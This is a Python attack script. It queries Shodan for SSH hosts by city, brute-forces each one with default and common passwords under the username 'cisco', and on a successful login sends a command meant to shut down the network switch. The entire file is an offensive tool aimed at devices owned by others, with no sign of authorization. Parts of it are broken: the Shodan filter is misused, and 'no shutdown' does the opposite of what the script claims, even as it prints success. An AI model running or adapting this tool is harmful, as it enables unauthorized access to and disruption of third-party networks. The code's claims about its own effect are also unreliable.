# Libraries import
import shodan
import paramiko


# Enter the API key for the Shodan.io account
SHODAN_API_KEY = "YOUR_API_KEY"

# Set up Shodan API client
api = shodan.Shodan(SHODAN_API_KEY)

# List of common passwords
common_passwords = ["cisco", "cisco123", "admin", "password", "root", "1234", "12345", "123456", "abc123", "123", "111", "qwerty", "letmein", "password1", "changeme", "default", "admin123", "12345678"]

# Method to turn off the switch given the switch's IP, username, and password.
def turn_off_switch(switch_ip, switch_username, switch_password):
    # Set up SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Success flag to track the result of switch operation.
    success = False
    try:
        # Connect to ssh-client
        ssh.connect(hostname=switch_ip, port=22, username=switch_username, password=switch_password, banner_timeout=60)

        # Turn off the switch
        ssh.exec_command("no shutdown")

        print(f"The switch with IP: {switch_ip} is turned off successfully.")
        # if the above command(s) execute successfully, then set the success flag.
        success = True

    except Exception as e:
        # if ssh connection or command execution failed without a specific error, print the exception.
        print(f"Expected exception occurred while trying to connect into {switch_ip}: ", e)

    finally:
        # Close SSH client
        ssh.close()

    # return success flag
    return success

# Run method to automatically discover switches in the given city
try:
    # Ask for input condition
    city = input("Enter the city where the switch is located: ")
    # Build up the search query for Shodan.
    query = f"net:{city} port:22"
    # Search Shodan for switches in that city.
    results = api.search(query)

    # Extract switch IP, username, and password from search results
    for result in results['matches']:
        switch_ip = result['ip_str']
        switch_username = "cisco" #default username for switch
        password_found = False
        
        # Read the password list from file if the file exists and add it to common_passwords list
        try:
            with open("passwords.txt", "r") as f:
                passwords = f.read().splitlines()
                common_passwords.extend(passwords)
        except (FileNotFoundError, PermissionError, Exception) as e:
            # Handle errors related to file reading, permissions, or unexpected errors
            print(f"Error while reading password files: {e}. Will continue with default password list")

        # Attempt login with default and common passwords
        for password in common_passwords:
            # Try to turn off the switch
            success = turn_off_switch(switch_ip, switch_username, password)
            if success:
                # If the switch is turned off and set the success flag, then we do not need to check for other passwords
                password_found = True
                break

        if not password_found:
            print(f"Could not turn off switch with IP: {switch_ip}")

except shodan.APIError as e:
    # Handle shodan errors.
    print(f"Shodan API Error: {e}")

except Exception as e:
    # Handle unexpected errors.
    print(f"Expected Exception: {e}")
